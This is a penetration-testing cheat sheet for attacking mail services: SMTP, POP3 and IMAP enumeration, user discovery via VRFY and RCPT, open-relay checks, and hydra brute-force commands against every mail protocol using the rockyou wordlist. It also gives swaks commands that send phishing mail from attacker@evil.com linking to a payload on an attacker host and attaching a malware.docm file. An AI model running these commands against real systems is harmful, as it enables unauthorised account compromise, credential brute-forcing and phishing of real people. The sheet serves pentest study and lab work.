# SMTP / POP3 / IMAP Enumeration & Exploitation

**Tags:** #smtp #email #enumeration #exploitation
**Ports:** SMTP 25/587/465, POP3 110/995, IMAP 143/993

---

## SMTP Enumeration

```bash
# Banner grab
nc -nv $TARGET 25
openssl s_client -connect $TARGET:587 -starttls smtp

# Nmap
nmap -p 25,587 --script smtp-commands,smtp-enum-users,smtp-ntlm-info $TARGET
nmap -p 25 --script smtp-open-relay $TARGET

# User enumeration (VRFY/EXPN/RCPT)
smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt -t $TARGET
smtp-user-enum -M RCPT -U users.txt -t $TARGET -D domain.com

# Manual VRFY
nc $TARGET 25
EHLO attacker.com
VRFY admin
VRFY root
EXPN admins@domain.com

# Manual RCPT
EHLO attacker.com
MAIL FROM: test@test.com
RCPT TO: admin@domain.com    # 250 = exists, 550 = doesn't exist
```

## SMTP Open Relay Test

```bash
# Test if server will relay for external domains
nc $TARGET 25
EHLO test.com
MAIL FROM: test@external.com
RCPT TO: victim@external2.com   # Should be rejected by properly configured server

# Automated
nmap -p 25 --script smtp-open-relay $TARGET
```

## Send Email via SMTP (Phishing / SSRF chain)

```bash
# swaks — Swiss Army Knife for SMTP
swaks --to victim@corp.com --from attacker@evil.com --server $TARGET --body "Click me: http://$LHOST/payload"
swaks --to victim@corp.com --from attacker@corp.com --server $TARGET --attach malware.docm --body "See attached"

# Send with auth
swaks --to user@domain.com --from sender@domain.com --server $TARGET --port 587 \
  --auth-user user@domain.com --auth-password $PASS --tls

# sendEmail
sendEmail -f from@domain.com -t to@domain.com -u "Subject" -m "Body" -s $TARGET

# Python
python3 -c "
import smtplib
s = smtplib.SMTP('$TARGET', 25)
s.sendmail('from@test.com','to@corp.com','Subject: Test\n\nBody')
"
```

## POP3 Enumeration

```bash
# Banner grab
nc -nv $TARGET 110
openssl s_client -connect $TARGET:995

# Manual commands
nc $TARGET 110
USER admin
PASS password
LIST         # List messages
RETR 1       # Read message 1
DELE 1       # Delete message 1
QUIT
```

## IMAP Enumeration

```bash
# Banner grab
nc -nv $TARGET 143
openssl s_client -connect $TARGET:993

# Manual IMAP
nc $TARGET 143
a LOGIN user password
a LIST "" "*"        # List folders
a SELECT INBOX       # Select folder
a FETCH 1 FULL       # Read first email
a LOGOUT
```

## Brute Force (All Mail Protocols)

```bash
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt smtp://$TARGET
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt pop3://$TARGET
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt imap://$TARGET
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt smtps://$TARGET -S
```

## Nmap Mail Scripts

```bash
nmap -p 25,110,143,465,587,993,995 --script "*smtp*,*imap*,*pop3*" $TARGET
```
